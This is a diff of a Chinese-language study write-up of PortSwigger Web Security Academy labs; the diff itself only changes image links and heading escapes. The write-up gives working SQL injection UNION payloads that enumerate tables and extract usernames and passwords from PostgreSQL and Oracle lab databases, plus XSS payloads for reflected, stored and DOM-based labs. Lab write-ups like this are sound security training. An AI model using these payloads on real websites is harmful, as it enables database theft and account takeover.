@@ -1,10 +1,10 @@
 # SQLI
 
-## https://portswigger\.net/web\-security/sql\-injection/lab\-retrieve\-hidden\-data
+## https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
 找到注入点
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGEyNTMyNGQ5YjhmMzgyMWVkYTkwM2QyMDhjNWE4ZGFfZGQxNzAzZWQ2MzU4YTZkMTQ5NmVmY2Q2YzkxYzBlZTRfSUQ6NzY2ODE0MDQwMTgzNjU3NTcxMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8d24667f5537.webp)
 
 ```Plain Text
 https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=
@@ -14,9 +14,9 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 
 由于union联合查询需要列数匹配，所以我们先用order by判断字段数
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGM3OGRmMjAzYTA2NmIxODFjZWI0MDk4NTdkNWE0M2FfNDFlYjJiYTY4YWIyZTNhMmE5ZWM4M2NhNzcwY2YyZWRfSUQ6NzY2ODE0MDc5MzkwMzUwMDU4NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ece2d32ef410.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmFkMDhjZGFkOTNmMDU4MTlhYmQ1YWNmMDNiZWE4OWNfYTI5ZTY2ODNmODVkYjViMjI4YzA3MzNmNDZmMWVjNjlfSUQ6NzY2ODE0MDg3NDI4Mjg2MzU5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a8e70afe9dd.webp)
 
 直到9时服务器报错，证明有八个字段值
 
@@ -26,7 +26,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 
 这边以eshop的Category表为例，这边where条件如果是字符类型，后面union如果是数字型，就会报错
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTk4MGExYjkxN2FiMTFhZDI1YzM2NTBmN2M0N2EzMGRfZmU5MDc3MmY3ZTJkYTgyMjJjY2VhZWEzMjk0ODFlYjlfSUQ6NzY2ODE0Mjc0MjUxNzc2MzAzNF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4177e211d71a.webp)
 
 所以判断回显位置的payload应该是
 
@@ -34,7 +34,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=' union select '1','2','3','4','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWM5NmRhYTQwMWZiMjY1NmFmZDYwNjNkMDhlNmZiYWVfYzMxYmE5Y2MyZjJmY2Q5YWVhYzgxODUwZGQ3MjVkZTlfSUQ6NzY2ODE0MzA0Njg1MzEzNTMzOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0b3022d15774.webp)
 
 确定3为回显位置，于是开始确定数据库
 
@@ -66,7 +66,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 1' union select '1','2',current_database(),'4','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzlhMWI3N2JlYzliY2E4ZGMzN2VjZTQ0YWI3MTBiYzFfNDE3ZjViNGQwNWY4Njk2ODBiZGNhZDUwNzc1NTRmMGVfSUQ6NzY2ODE0NjIyMDI4NDYxMTU1N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/05c8b4aa69d4.webp)
 
 这边只有current\_database\(\)正常返回，推断靶场使用的是**PostgreSQL数据库，当前数据库名是“academy\_labs”**
 
@@ -76,7 +76,7 @@ https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?categor
 https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?category=1'+union+select+'1','2',version(),'4  ','5','6','7','8'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTllNjE0MWIyNTEzMWJiMDNiODMzMzZlMGQ2OTUzYzdfODU2ODJkMzRhMjhmMGMxZjY5YjlkYjY1ZTkwMGM3YmJfSUQ6NzY2ODIwNDg2ODM4MTQ0NTA2NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/67c2c91a152b.webp)
 
 
 
@@ -88,7 +88,7 @@ https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?categor
 
 先来看看information\_schema数据库tables表的结构，以查询mysql中的world表名为例
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjAzYjQwNzY5NjdhZDMwY2RkN2E1MDE3NGI2MzhmYjNfYzNjOWViNTc5NDkxNzFjN2ExMDI4NTY2M2EzMDY0ZGJfSUQ6NzY2ODE1MzE0ODAyODczNDY2Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a1c314313397.webp)
 
 我们可以看到该表中存在两个字段，一个是TABLE\_SCHEMA存放的所有的数据库名，TABLE\_NAME存放了所有的表名
 
@@ -98,7 +98,7 @@ https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?categor
 select table_name from information_schema.TABLES where table_schema='world';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDBmZmYxMTk3NTExODdjNTg3MDg0OGFmMjY0MmMxY2NfMTRiZWIwNTdhMmU0YzAyMTNmMjBhNGI1ZjM4YjE5NDZfSUQ6NzY2ODE1NTQzMTA5NzA3NzAwMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2246bfeac76a.webp)
 
 因为只有一个回显位置，所以我们可以使用group\_concat\(\)将查询结构合并为一个字符串
 
@@ -106,7 +106,7 @@ select table_name from information_schema.TABLES where table_schema='world';
 select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schema='world';
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Njk2ZjlkMmY0NjA0OGI3YTU5MDcxNjlkYzZmZGY0ZjdfNDU2MmQyN2ViMGQ2ZDMyNGJkZmQ1ZDc2MmZhNGRjOTNfSUQ6NzY2ODE1NTE4MDc4MTQyMzg1Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9fac9a70feff.webp)
 
 
 
@@ -116,7 +116,7 @@ select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schem
 
 下面是历尽千辛万苦本地部署的PostgreSQL数据库，创建了users和products表来进行理解
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzQzMWQyYmY4NGNhODExMzJiNzYzM2U5NjczOTZiMWVfYmVhNzZjMjQ4OTJjMjQ5NjE5ODA1Yjc3ZjI3YjM2NjhfSUQ6NzY2ODIxMDM2NDExNDYzNjA1OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/14ac5d1c5201.png)
 
 所以相应的我们的payload也要发生改变，不能使用group\_concat了，而要改成STRING\_AGG\(table\_name, ','\)
 
@@ -124,17 +124,17 @@ select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schem
 1' union select '1','2',STRING_AGG(table_name, ','),'4','5','6','7','8' from information_schema.tables where table_schema='public'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDhlMzFhYzhiMTRjNTJjODUwZDQ4YWYwOGU5ZDkxNGJfNjAzYWE2NDljZGZjYTkyZDJjMTRjNDdmZDMzYTYyMTRfSUQ6NzY2ODIxMTk0MjUxNTg4NzM3Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dac23c0f1503.webp)
 
 我去不早说，当我正在纠结怎么查询表的字段值时，研究发现information\_schema\.columns表中东西更全，包括每张表的名字和每张表的字段名。这边懒得改了，能用就行
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTUwMDljZWVmMTk3NGEzMjNkY2YzODM4NGZjZTc2NDJfODg0MWIwODAwMmJlMjBjZjEzNmZkM2I4ZWE2ZmQyZjZfSUQ6NzY2ODIxMzE4OTg1OTc3MzM2OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d4fbca4281bf.png)
 
 ```SQL
 https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?category=1' union select '1','2',STRING_AGG(column_name, ','),'4','5','6','7','8' from information_schema.columns where table_name='products'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzFmNDY1MWIwNWY1NzAyMzMwYWY3OTg1ZGE0NzY3MjNfMWI1NWM4YjczMzNhOGNkNGYyZjRhMGUxZDNjNDk1ZmZfSUQ6NzY2ODIxMzk3MjMzNjQzMDAzNF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/40f31f5fa304.webp)
 
 
 
@@ -154,9 +154,9 @@ https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?categor
 
 ok，下面这关我得认真看题目要求了
 
-## https://portswigger\.net/web\-security/sql\-injection/lab\-login\-bypass
+## https://portswigger.net/web-security/sql-injection/lab-login-bypass
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzY1YjhjYTQ5Y2YzOWY0MTU2Nzk1MWRhYWIzYmIzN2ZfNGQyYjQwZDMwZmQ0ZTM3OTMxZDhjYzgxNTcwYmIxMDhfSUQ6NzY2ODIxNjU1Mjg2MDMwNjM3MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/894e30168f42.webp)
 
 该实验在登录功能中存在一个SQL注入漏洞。
 
@@ -170,17 +170,17 @@ ok，下面这关我得认真看题目要求了
 
 
 
-## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-querying\-database\-version\-oracle
+## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
 
 该实验在产品类别过滤功能中存在一个SQL注入漏洞。您可以使用UNION攻击来获取注入查询的结果。
 
 要解决该实验，请显示数据库版本字符串。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWVlNWU5ZTYxNGE0YjVkZWJmZjljOTMxMTc4NzU5NzFfMGQ5ZTc0MjZkYTYyZDMzNmViZGQxOWFhM2M1OTQ5NjFfSUQ6NzY2ODIxOTY0NjAzNDY0NDE0OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b26d38b99013.webp)
 
 两个字段
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=N2Q5NjA3YTYyYmMyZDY3NzRjMzMyZDQ5MmVjYmZmZGJfMmEzM2ViZTMzNTJjN2YzMjNmNjY4MzljZTMzNTk5OWJfSUQ6NzY2ODIyMDA5NjYzNjczNDY3M18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f5bf08ecb24f.webp)
 
 哎，怎么回显不了
 
@@ -194,7 +194,7 @@ ok，下面这关我得认真看题目要求了
 https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?category=' union select null,null from dual--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTRmZGE4ZmFjY2Y3NjUzNDM1YWZlMzhhOTc0Nzc5ZDhfNzUzNDRkYmY5NmM1ZDZhYzc5MzFjZGVlZjhhNjhhMTZfSUQ6NzY2ODIyMTA1MjA1MjgxODkwMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5320edb3907b.webp)
 
 这样确实有回显了
 
@@ -207,11 +207,11 @@ https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?categor
 
 
 
-## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-querying\-database\-version\-mysql\-microsoft
+## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzU3ZmFhMjY3ZTllOWM0MWU0OTM2MjQ1OTA2ODk1NjJfNTk4YzliNTZjMjFhN2I5NmY2M2M5NjExODRjNDA5NjZfSUQ6NzY2ODIyMTY2NTQ0OTAyMDM3OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/16c8d8fc06b1.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmZjYjYxNjc0MjlmOWRkM2Q4Yzc5MWQ1ZmRjMDQ2NzFfZjJiODgxODFmN2U2OGE4MzdkOTE2NTFlMjU0ZWI3NGNfSUQ6NzY2ODIyMjQ2NjUyMzkyNTczOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4532fa1ef0d2.webp)
 
 这边用1,2就能正常回显了
 
@@ -245,9 +245,9 @@ https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?categor
 
 
 
-## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-listing\-database\-contents\-non\-oracle
+## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmU4Y2JmNjliNzgzNGZmNzU4NmQ1ODZlYzNmZWM3NWRfNjY4ZjJjOWM2Mjc2YWMxZDk3MmM2NDA2NTM5ODY0NjBfSUQ6NzY2ODIyMzE0MjEwNDQ4NTEwMF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/977c0fa06360.webp)
 
 实验：SQL注入攻击——列出非Oracle数据库中的数据库内容
 
@@ -261,15 +261,15 @@ https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?categor
 
 看来我们是需要通过产品类别的注入点，获取到账户表，然后用admin账户进行登录
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjA2OTg3MmQ3OGI1ZTcwMGM2ZTA5Mzk0Njk2NDJiNmZfOTI2MmM4YTRhODE4YmIxNmE5YThhZWNmMmVlMTAwNjFfSUQ6NzY2ODIzNzMxMDIxMDgyMTQwN18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4fef0ec3a339.webp)
 
 判断出来说两个字段，下面判断回显位置
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjY1Y2M3YWM4NTU5ZGViMmQ5NTc0ZTQwN2I5OTI3MGJfMzQxZGYxMTQxYmVhY2EzZjMyMmY4Y2U0OTcwZjMzNWZfSUQ6NzY2ODIzNzM3MTU2NTE4MjE1NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ef0a8e8e8768.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzU0NmI2ZGU0NDZjZmEyZWYwOTM3NWNjYTlhN2M0M2VfNWY2YWM5Y2U5OGZmY2FlNDE0OTMwNzc1MTMwZjQwNTNfSUQ6NzY2ODIzNzU1NTI5NjUwNTEzM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8f35aab6f3e8.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzMwNDkzNWFhNjQyMDYxNmVkZjZjMGY0NjNiNjMyNTJfOGQ0YjdkMjg2MDNhNTMxMGUyZGJmZGQ0ZTc4MDcyYzFfSUQ6NzY2ODIzNzY1MjQ2MjY1MjY4MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/509f9b3bb0ba.webp)
 
 这边判断还是之前那个数据库，之前用之前的payload查看所有表
 
@@ -277,13 +277,13 @@ https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?categor
 https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select '1',STRING_AGG(table_name, ',') from information_schema.columns where table_schema='public'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZDkyZmVlY2UzNWY1Y2E4MDAxZTM5MTI5Nzk0YjdiZWRfNDIxOTcyOWZlYzg5NTU1YzMyMDk5YWY2Y2E2Njg5Y2ZfSUQ6NzY2ODIzODQ4Njg2NjQzMDk0Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/2d6615ac8434.webp)
 
 看到可疑目标users\_beemrx表了
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWE2ZjM4MGI2ZDBkOWUxMjcyOWY5MmFmNDIwMjNmYmZfMmZkZjY1MGUxYzAzNGMwZmU3ODUxMjg2Y2U0NWViNzlfSUQ6NzY2ODIzODkwNjM3NDI2MTcxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1e027c6ad83a.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGQzNDE5NTI5MTVkYWNjOWQ4NTQwZjczMjEzNmI0NjBfNWQwM2RhMmI5NTRjNThjMzUwN2NmZjQ2OTFiZDU0NTJfSUQ6NzY2ODI0MDg1NzAyNzY0NDM3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1d4c55451169.webp)
 
 ```Plain Text
 https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select username_mebmkr,password_esqokj from users_beemrx--+
@@ -293,9 +293,9 @@ https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?categor
 
 
 
-## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-listing\-database\-contents\-oracle
+## https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=N2Y4ZTMzNjVkM2I5YTUzZTEyMjdhNzdkZGFkODI5MzVfZTgzMzAwMGJjYmU3YTY2ZWUyZTVlZmIxNDIyOTljMDJfSUQ6NzY2ODI0MTQ3OTQyNTIzMjE2MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/41e7c3627b22.webp)
 
 该实验在产品类别过滤功能中存在一个SQL注入漏洞。查询的结果会返回在应用程序的响应中，因此您可以使用UNION攻击从其他表中检索数据。
 
@@ -307,11 +307,11 @@ https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?categor
 
 这一关看来需要熟悉oracle语法了
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGRiYzRlZmM2MTdmY2VkOGM1NzYwMzdlYzNhYTAzZWVfYmM3ZWM2MjE0ZTc4ZDM0NDA3ODM1OGMyODQyMDk3MDVfSUQ6NzY2ODI0MjcxODc5MTQwNDUyMF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c1ef3e7b7dc1.webp)
 
 还是两个字段
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzU2MGI5YzY3YTI1NWZlNjIwOGQ5MmEzOGQzODE3MDFfMTJhZTFmMzYzNzUyNWMwMTJjZjk4MTgwN2JjNDk1OGJfSUQ6NzY2ODI0Mjg3MzA4MzQ0ODU0Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e04153506785.webp)
 
 null占位，dual默认表
 
@@ -321,7 +321,7 @@ null占位，dual默认表
 https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT table_name, NULL FROM user_tables--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTc4MzA0NDc2YmU5ZmJlOTM5M2E0ZDdhOTk1OGJjZGRfYmJkYTk1YTk3MzE2YzVkNmNkMGM2OTBjMzNkYWRjZThfSUQ6NzY2ODI0NjI2MTkyOTI0OTk3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/65c1f460509c.webp)
 
 表名是USERS\_SAYUJR，下面获取字段名
 
@@ -329,7 +329,7 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT column_name, NULL FROM user_tab_columns WHERE table_name = 'USERS_SAYUJR'--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDU3MThlZWEzZTljZjU5NWRlZTk2N2U4ZDcwYTJjNzVfMGUwNTY3ZjQ3ODE3NTk2NTk4YzBjZGI4MjM5OWE1N2RfSUQ6NzY2ODI0NjY1NzM5ODYzOTg4NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5bf42714dc4c.webp)
 
 
 
@@ -339,7 +339,7 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT USERNAME_RZOLHN, PASSWORD_GFUNGG FROM USERS_SAYUJR--+
 ```
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWFmNDQyMDNhMjk5NjlmZGViNmIzMDI0ZTQ3MDkyZGRfN2Y0NTA1YjQ1ZGI5M2I5OWI2MTE0YjQyOTA2YjlkMzdfSUQ6NzY2ODI0NzE2MDUxNzQxMzg0OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8bfecfa8a276.webp)
 
 
 
@@ -347,11 +347,11 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 
 # XSS（Cross\-site scripting）
 
-## https://portswigger\.net/web\-security/cross\-site\-scripting/reflected/lab\-html\-context\-nothing\-encoded
+## https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTljYzA4ZWMyYTRkZDg3MDNhMzk0YWQwOTJkYTQwZGRfNzYxYmE4ZGU3YmI0Njc1NjBjM2JlMDc0ZWQ5MWRkM2NfSUQ6NzY2ODI0Nzg2MDU5MzQxMzA2NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1eb1d1438f11.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDk5NDEwNDFjMzlhNTJlNGI1ZjBlMmY4YzkwYzgzZTJfYTBkZDJkMTJhYWQ2MDk3OGViNzMzMjE4NjVhNjBkMGVfSUQ6NzY2ODI1MDAxNDExODIzNTExNV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/dd0b50135e7d.webp)
 
 在搜索框输出就完事
 
@@ -363,17 +363,17 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 
 
 
-## https://portswigger\.net/web\-security/cross\-site\-scripting/stored/lab\-html\-context\-nothing\-encoded
+## https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
 
 在评论区输入xss脚本就行
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmJmYzExMWFjNzBmY2ZmYjE3YTQxYzU3M2RhN2EzYTZfOTA5M2QzOTM2Mzk1ZTljN2JkYjg4ZThlNmRhZDYyM2FfSUQ6NzY2ODQ5Mjc0OTMzMDg3NzY3Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9a5a6f12d65b.webp)
 
 
 
 
 
-## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-document\-write\-sink
+## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
 
 实验：使用源 location\.search 在 document\.write 接收器中实现 DOM 型 XSS
 
@@ -381,13 +381,13 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 
 要解决本实验，请执行一次调用 `alert` 函数的跨站脚本攻击。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODlmMDc0NmVkOTBhNGU3YWI2YWFiNzAzYTUxYjU3NjBfNmQ4YmE0ZmMyYmJlY2FlOWFmY2QyODhmY2VjODk2YWRfSUQ6NzY2ODQ5NTY0NTk0MjQzNDc0NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/25cbb850c577.webp)
 
 打开是一个搜索框，这应该是我们写入脚本的地方
 
 我们查看源代码
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTg3Njk4NWM3ODQxM2Y4MTZjNTVkYTEwOTJkM2NlNDFfM2MyNzhiNjM0NWE4Mzc0OWYzZWQwZDNjMzEwMTcwN2JfSUQ6NzY2ODQ5NTc5OTQxMjA1MTIwNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6671d78c5f3a.webp)
 
 发现我们输入的语句会与'\<img src="/resources/images/tracker\.gif?searchTerms='连接，然后 document\.write写到页面上
 
@@ -397,19 +397,19 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 
 然后后面跟xss脚本\<script\>alert\(1\)\</script\>
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTkyYTcxYjQ4MDRlNzFjYTkzZTIwMWRjNGNjZWFjZTBfZWRkYzc3N2E4ZjA3ZWRmYWJmNWNmNmI3OWVlNjEyM2RfSUQ6NzY2ODQ5NzE2ODY5MjU2MzIzM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b037e09d9323.webp)
 
 就执行成功了
 
 
 
-## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-innerhtml\-sink
+## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzgwYTI5ZTA5OGEyYmJkYTIxMmIxZTJiMWUxMDU1ZWRfYzVhNWM2Y2QyN2JlY2E2MTI1YTJlMmU3MGY1NzQxZmFfSUQ6NzY2ODUwMTc0Nzc1Njc2NDM2M18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f313769816b4.webp)
 
 还是一个搜索框，直接看源代码
 
